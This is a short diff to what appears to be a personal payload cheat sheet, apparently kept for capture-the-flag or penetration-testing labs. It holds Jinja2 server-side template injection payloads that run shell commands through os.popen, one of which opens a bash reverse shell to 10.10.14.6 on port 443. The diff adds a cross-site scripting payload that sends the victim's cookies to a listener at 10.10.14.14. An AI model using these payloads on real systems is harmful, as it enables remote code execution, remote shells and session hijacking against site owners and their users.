@@ -72,4 +72,11 @@ SSTI Payloads:
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}
 
+*******************************************************************************************************************************
+
+XSS Payload:
+
+<script>new Image().src="http://10.10.14.14:8888/cookie.php?c="+document.cookie;</script>
+
+
 
